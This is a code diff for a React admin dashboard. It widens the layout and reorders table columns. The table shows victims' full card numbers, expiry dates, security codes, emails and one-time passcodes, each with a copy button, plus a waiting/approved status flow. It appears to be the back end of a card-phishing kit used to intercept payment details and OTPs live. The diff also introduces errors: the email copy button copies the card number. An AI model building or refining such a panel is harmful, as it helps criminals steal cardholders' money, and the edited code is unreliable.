@@ -195,7 +195,7 @@ async function copyText(value: string) {
   }
 
   return (
-    <main className="mx-auto max-w-5xl px-6 py-10">
+  <main className="mx-auto w-full max-w-[1600px] px-4 py-10">
       <div className="flex items-center justify-between gap-4">
         <h1 className="text-3xl font-semibold">Admin dashboard</h1>
         <button
@@ -237,8 +237,8 @@ async function copyText(value: string) {
 
       {message && <p className="mt-4 text-sm text-[#9aa8b8]">{message}</p>}
 
-      <div className="mt-8 overflow-x-auto rounded-xl border border-[#2a3548]">
-        <table className="w-full min-w-[720px] text-left text-sm">
+      <div className="mt-8 w-full rounded-xl border border-[#2a3548]">
+        <table className="w-full table-fixed text-left text-sm">
           <thead className="bg-[#1a2332] text-[#9aa8b8]">
             <tr>
               <th className="px-3 py-2">Created</th>
@@ -247,9 +247,9 @@ async function copyText(value: string) {
             <th className="px-3 py-2">MM/YY</th>
             <th className="px-3 py-2">Security Code</th>
             <th className="px-3 py-2">Email</th>
-              <th className="px-3 py-2">Status</th>
-              <th className="px-3 py-2">OTP</th>
-              <th className="px-3 py-2">Actions</th>
+            <th className="px-3 py-2">OTP</th>
+            <th className="px-3 py-2">Status</th>
+            <th className="px-3 py-2">Actions</th>
               
             </tr>
           </thead>
@@ -275,8 +275,8 @@ async function copyText(value: string) {
                 >
                   Copy
                 </button>
-
                 </td>
+                
                 <td className="px-3 py-2 tracking-wider">
                 {(row.card_number ?? "").replace(/(\d{4})(?=\d)/g, "$1 ")}
                  <button
@@ -304,19 +304,20 @@ async function copyText(value: string) {
                   Copy
                 </button>
                 </td>
-                <td className="px-3 py-2">{row.email}
-                  <button
+                <td className="px-3 py-2 tracking-wider">
+                {(row.email ?? "").replace(/(\d{9})(?=\d)/g, "$1 ")}
+                 <button
                   type="button"
                   className="ml-2 text-xs text-[#9aa8b8] underline"
-                  onClick={() => copyText(row.email)}
+                  onClick={() => copyText(row.card_number)}
                 >
                   Copy
                 </button>
                 </td>
-                <td className="px-3 py-2 capitalize">{row.status}</td>
-                 <td className="px-3 py-2">{row.waiting_name ?? "—"}
-                  
+                  <td className="px-3 py-2">{row.waiting_name ?? "—"}
                  </td>
+                <td className="px-3 py-2 capitalize">{row.status}</td>
+               
                 <td className="px-3 py-2">
   {row.status === "approved" ? (
     <span className="text-[#9aa8b8]">—</span>
